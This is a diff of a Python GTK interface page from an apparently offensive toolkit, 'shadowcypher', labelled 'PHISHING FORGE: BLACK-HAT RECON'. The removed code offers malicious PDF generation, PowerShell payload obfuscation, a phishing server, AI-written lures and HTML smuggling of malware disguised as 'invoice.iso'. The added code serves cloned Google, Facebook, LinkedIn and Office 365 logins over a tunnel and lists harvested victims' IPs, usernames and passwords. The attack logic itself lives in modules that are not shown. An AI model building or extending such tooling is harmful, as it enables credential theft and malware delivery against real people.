@@ -1,186 +1,133 @@
 import gi
 gi.require_version("Gtk", "3.0")
 from gi.repository import Gtk, GLib
-import os
-
-from shadowcypher.ui.base_page import BasePage
-from shadowcypher.modules.phishing import Phishing
+import json
 from shadowcypher.core.logger import logger
+from shadowcypher.core.bus import bus
 
-class PhishingPage(BasePage):
-    """Deep Phishing & Social Engineering Interface."""
-
+class PhishPage(Gtk.Box):
     def __init__(self):
-        super().__init__("\U0001f3a3 PHISHING_ASSAULT (ShadowPhish Bridge)")
+        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=20)
+        self.set_margin_top(40)
+        self.set_margin_start(40)
+        self.set_margin_end(40)
+        self.victims = []
+        self._setup_ui()
+        bus.subscribe("phish_victim_captured", self._on_victim_async)
 
-        from shadowcypher.ui.components import DataPod
+    def _setup_ui(self):
+        # Header
+        header_hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
+        title_lbl = Gtk.Label()
+        title_lbl.set_markup("<span size='xx-large' weight='bold' color='#facc15'>PHISHING FORGE: BLACK-HAT RECON</span>")
+        header_hbox.pack_start(title_lbl, False, False, 0)
         
-        # Populate Metrics
-        self.pod_creds = DataPod("CAPTURED_CREDS", "0", "cyan")
-        self.pod_uptime = DataPod("SERVER_UPTIME", "IDLE", "violet")
-        self.pod_success = DataPod("SUCCESS_RATIO", "0.0%", "amber")
-        
-        self.metric_strip.pack_start(self.pod_creds, True, True, 0)
-        self.metric_strip.pack_start(self.pod_uptime, True, True, 0)
-        self.metric_strip.pack_start(self.pod_success, True, True, 0)
+        self.status_lbl = Gtk.Label(label="FORGE_READY: Waiting for template ignition...")
+        self.status_lbl.get_style_context().add_class("dim-text")
+        header_hbox.pack_end(self.status_lbl, False, False, 0)
+        self.add(header_hbox)
 
-        # Build Notebook
-        notebook = Gtk.Notebook()
-        notebook.append_page(self._build_artifacts_tab(), Gtk.Label(label="Artifacts"))
-        notebook.append_page(self._build_server_tab(), Gtk.Label(label="Phish Server"))
-        notebook.append_page(self._build_smuggling_tab(), Gtk.Label(label="Smuggling"))
-        self.workspace.pack_start(notebook, True, True, 0)
-        
-        # Termination control
-        self.workspace.pack_start(self.build_stop_button(), False, False, 0)
+        self.add(Gtk.Separator(orientation=Gtk.Orientation.HORIZONTAL))
 
-    def _build_artifacts_tab(self):
-        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
-        box.set_margin_top(15); box.set_margin_bottom(15); box.set_margin_start(15); box.set_margin_end(15)
+        # Main Layout
+        main_hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=20)
+        self.add(main_hbox)
 
-        # 1. PDF Artifact
-        row_pdf = Gtk.Box(spacing=10)
-        row_pdf.pack_start(Gtk.Label(label="Redirect URL:"), False, False, 0)
-        self.pdf_url = Gtk.Entry()
-        self.pdf_url.set_placeholder_text("https://phish.target.com/login")
-        self.pdf_url.set_hexpand(True)
-        row_pdf.pack_start(self.pdf_url, True, True, 0)
-        box.pack_start(row_pdf, False, False, 0)
+        # 1. Forge Setting Area
+        forge_settings = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=15)
+        forge_settings.set_size_request(400, -1)
+        forge_settings.get_style_context().add_class("terminal-box")
+        forge_settings.set_margin_start(10)
+        forge_settings.set_margin_end(10)
+        forge_settings.set_margin_top(10)
 
-        btn_pdf = self.make_action_btn("\U0001f4c4 Generate Malicious PDF", self._on_pdf, "danger-btn")
-        box.pack_start(btn_pdf, False, False, 0)
+        settings_header = Gtk.Label()
+        settings_header.set_markup("<span weight='bold' color='#94a3b8'>// FORGE_SETTINGS</span>")
+        settings_header.set_halign(Gtk.Align.START)
+        forge_settings.pack_start(settings_header, False, False, 10)
 
-        box.pack_start(Gtk.Separator(), False, False, 5)
-
-        # 2. PowerShell Obfuscation
-        lbl = Gtk.Label(label="PowerShell Payload (Raw):", xalign=0)
-        box.pack_start(lbl, False, False, 0)
-        
-        self.ps_input = Gtk.TextView()
-        self.ps_input.set_size_request(-1, 100)
-        scroll = Gtk.ScrolledWindow()
-        scroll.add(self.ps_input)
-        box.pack_start(scroll, False, False, 0)
-
-        row_opts = Gtk.Box(spacing=20)
-        self.chk_b64 = Gtk.CheckButton(label="Base64 Encode")
-        self.chk_b64.set_active(True)
-        self.chk_comp = Gtk.CheckButton(label="Deflate Compression")
-        self.chk_comp.set_active(True)
-        row_opts.pack_start(self.chk_b64, False, False, 0)
-        row_opts.pack_start(self.chk_comp, False, False, 0)
-        box.pack_start(row_opts, False, False, 0)
-
-        btn_ps = self.make_action_btn("\u26a1 Obfuscate PS1", self._on_ps)
-        box.pack_start(btn_ps, False, False, 0)
-
-        return box
-
-    def _build_server_tab(self):
-        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
-        box.set_margin_top(15); box.set_margin_bottom(15); box.set_margin_start(15); box.set_margin_end(15)
-
-        row = Gtk.Box(spacing=10)
-        row.pack_start(Gtk.Label(label="Template:"), False, False, 0)
+        # Template Selection
         self.template_combo = Gtk.ComboBoxText()
+        self.template_combo.append("google", "Google Login (v2)")
+        self.template_combo.append("facebook", "Facebook (Standard)")
+        self.template_combo.append("linkedin", "LinkedIn (HR Sweep)")
+        self.template_combo.append("microsoft", "Office 365 (Enterprise)")
+        self.template_combo.set_active_id("google")
+        forge_settings.pack_start(self.template_combo, False, False, 5)
+
+        # Tunnel Switch
+        tunnel_hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
+        tunnel_lbl = Gtk.Label(label="IGNITE CLOUDFLARE TUNNEL (HTTPS)")
+        self.tunnel_switch = Gtk.Switch()
+        self.tunnel_switch.set_active(False)
+        tunnel_hbox.pack_start(tunnel_lbl, False, False, 0)
+        tunnel_hbox.pack_end(self.tunnel_switch, False, False, 0)
+        forge_settings.pack_start(tunnel_hbox, False, False, 10)
+
+        port_lbl = Gtk.Label(label="SERVICE_PORT: 8080 (Default)")
+        port_lbl.get_style_context().add_class("dim-text")
+        forge_settings.pack_start(port_lbl, False, False, 5)
+
+        self.ignite_btn = Gtk.Button(label="IGNITE FORGE")
+        self.ignite_btn.get_style_context().add_class("action-button")
+        self.ignite_btn.connect("clicked", self._ignite_phish)
+        forge_settings.pack_start(self.ignite_btn, False, False, 20)
+
+        main_hbox.pack_start(forge_settings, False, False, 0)
+
+        # 2. Live Victim Area
+        victim_panel = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=10)
+        victim_panel.get_style_context().add_class("terminal-box")
         
-        # PRO_DIVE: Scrape real templates from the modules directory
-        from shadowcypher.core.config import config
-        project_root = str(config.project_root)
-        tpl_dir = os.path.join(project_root, "shadowcypher/modules/phish_data/sites")
-        if os.path.exists(tpl_dir):
-            templates = sorted([d for d in os.listdir(tpl_dir) if os.path.isdir(os.path.join(tpl_dir, d))])
-            for t in templates:
-                self.template_combo.append_text(t.capitalize())
-        else:
-            # Fallback
-            for t in ["Google", "Microsoft", "Steam", "Facebook", "Instagram"]:
-                self.template_combo.append_text(t)
+        victim_header = Gtk.Label()
+        victim_header.set_markup("<span weight='bold' color='#94a3b8'>// LIVE_VICTIM_HARVEST</span>")
+        victim_header.set_halign(Gtk.Align.START)
+        victim_panel.pack_start(victim_header, False, False, 10)
+
+        scroller = Gtk.ScrolledWindow()
+        scroller.set_policy(Gtk.PolicyType.NEVER, Gtk.PolicyType.AUTOMATIC)
+        self.victim_list = Gtk.ListBox()
+        self.victim_list.set_selection_mode(Gtk.SelectionMode.NONE)
+        self.victim_list.get_style_context().add_class("victim-list")
+        scroller.add(self.victim_list)
+        victim_panel.pack_start(scroller, True, True, 0)
         
-        self.template_combo.set_active(0)
-        row.pack_start(self.template_combo, True, True, 0)
-        box.pack_start(row, False, False, 0)
+        main_hbox.pack_end(victim_panel, True, True, 0)
 
-        row2 = Gtk.Box(spacing=10)
-        row2.pack_start(Gtk.Label(label="Local Port:"), False, False, 0)
-        self.phish_port = Gtk.SpinButton.new_with_range(80, 65535, 1)
-        self.phish_port.set_value(8080)
-        row2.pack_start(self.phish_port, False, False, 0)
+    def _ignite_phish(self, btn):
+        template = self.template_combo.get_active_id()
+        use_tunnel = self.tunnel_switch.get_active()
+        logger.info("phish", f"IGNITING_FORGE: Template={template} Tunnel={use_tunnel}")
+        self.status_lbl.set_text(f"FORGE_ACTIVE: Serving {template} clone on port 8080...")
+
+    def _on_victim_async(self, data):
+        GLib.idle_add(self._on_victim, data)
+
+    def _on_victim(self, data):
+        self.victims.append(data)
+        row = Gtk.ListBoxRow()
+        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=2)
+        vbox.set_margin_top(10)
+        vbox.set_margin_start(10)
         
-        self.chk_tunnel = Gtk.CheckButton(label="SECURE_TUNNEL (HTTPS)")
-        row2.pack_start(self.chk_tunnel, False, False, 10)
-        box.pack_start(row2, False, False, 0)
+        ip_lbl = Gtk.Label()
+        ip_lbl.set_markup(f"<span weight='bold' color='#f87171'>VICTIM DETECTED: {data.get('ip')}</span>")
+        ip_lbl.set_halign(Gtk.Align.START)
+        vbox.pack_start(ip_lbl, False, False, 0)
+        
+        creds_lbl = Gtk.Label()
+        creds_lbl.set_markup(f"<span weight='bold' color='#4ade80'>CREDENTIALS: {data.get('username')} / {data.get('password')}</span>")
+        creds_lbl.set_halign(Gtk.Align.START)
+        vbox.pack_start(creds_lbl, False, False, 0)
+        
+        ua_lbl = Gtk.Label()
+        ua_lbl.set_markup(f"<span size='x-small' color='#94a3b8'>UA: {data.get('agent', 'Unknown')[:64]}...</span>")
+        ua_lbl.set_halign(Gtk.Align.START)
+        vbox.pack_start(ua_lbl, False, False, 0)
+        
+        row.add(vbox)
+        self.victim_list.add(row)
+        self.victim_list.show_all()
 
-        btn = self.make_action_btn("\U0001f310 Launch Phishing Server", self._on_start_server, "danger-btn")
-        box.pack_start(btn, False, False, 0)
-
-        btn_ai = self.make_action_btn("\U0001f9e0 Synthesize AI-Lure", self._on_ai_lure)
-        box.pack_start(btn_ai, False, False, 0)
-
-        return box
-
-    def _build_smuggling_tab(self):
-        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
-        box.set_margin_top(15); box.set_margin_bottom(15); box.set_margin_start(15); box.set_margin_end(15)
-
-        row = Gtk.Box(spacing=10)
-        row.pack_start(Gtk.Label(label="Source File:"), False, False, 0)
-        self.smuggle_file = Gtk.Entry()
-        self.smuggle_file.set_placeholder_text("/path/to/malware.exe")
-        row.pack_start(self.smuggle_file, True, True, 0)
-        box.pack_start(row, False, False, 0)
-
-        row2 = Gtk.Box(spacing=10)
-        row2.pack_start(Gtk.Label(label="Download Name:"), False, False, 0)
-        self.smuggle_name = Gtk.Entry()
-        self.smuggle_name.set_text("invoice.iso")
-        row2.pack_start(self.smuggle_name, True, True, 0)
-        box.pack_start(row2, False, False, 0)
-
-        btn = self.make_action_btn("\U0001f4e6 Generate HTML Smuggler", self._on_smuggling)
-        box.pack_start(btn, False, False, 0)
-
-        return box
-
-    # ── Handlers ──
-
-    def _on_pdf(self, btn):
-        url = self.pdf_url.get_text().strip()
-        if not url:
-            self.on_output("[ERROR] Please specify a redirect URL.")
-            return
-        res = Phishing.generate_pdf(url)
-        self.on_output(res)
-
-    def _on_ps(self, btn):
-        buf = self.ps_input.get_buffer()
-        script = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).strip()
-        if not script:
-            self.on_output("[ERROR] Please enter a script to obfuscate.")
-            return
-        b64 = self.chk_b64.get_active()
-        comp = self.chk_comp.get_active()
-        res = Phishing.generate_obfuscated_ps1(script, use_b64=b64, use_compress=comp)
-        self.on_output(res)
-
-    def _on_start_server(self, btn):
-        tmpl = self.template_combo.get_active_text()
-        port = int(self.phish_port.get_value())
-        use_tunnel = self.chk_tunnel.get_active()
-        self.clear_output(f"Launching {tmpl} phishing site on port {port} (Bridge: {'HTTPS_TUNNEL' if use_tunnel else 'LOCAL'})...\n")
-        Phishing.start_phishing_server(tmpl, port, self.on_output, use_tunnel=use_tunnel)
-
-    def _on_ai_lure(self, btn):
-        tmpl = self.template_combo.get_active_text()
-        self.terminal.log(f"INITIATING_DEEPHAT_SYNTHESIS: Forging {tmpl} persuasion lure...", "AI")
-        res = Phishing.generate_professional_bait(tmpl, "http://localhost:8080")
-        self.terminal.log(res, "SUCCESS")
-
-    def _on_smuggling(self, btn):
-        path = self.smuggle_file.get_text().strip()
-        name = self.smuggle_name.get_text().strip()
-        if not path:
-            self.on_output("[ERROR] Specify a source file path.")
-            return
-        res = Phishing.generate_html_smuggling(path, name)
-        self.on_output(res)
+# For dynamic loading in app.py
+PhishingPage = PhishPage
